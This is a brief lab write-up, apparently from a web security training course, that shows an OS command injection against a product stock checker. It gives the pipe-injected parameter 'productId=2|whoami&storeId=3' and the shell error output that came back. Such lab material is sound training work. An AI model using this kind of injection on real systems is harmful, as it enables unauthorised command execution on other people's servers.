# OS command injection, simple case

## This lab contains an [OS command injection] vulnerability in the product stock checker.

## The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

## To solve the lab, execute the `whoami` command to determine the name of the current user.

step1
productId=2&storeId=3

### step2

productId=2|whoami&storeId=3

whoami: extra operand '1' Try 'whoami --help' for more information. /home/peter-IcRB7s/stockreport.sh: line 5: $2: unbound variable
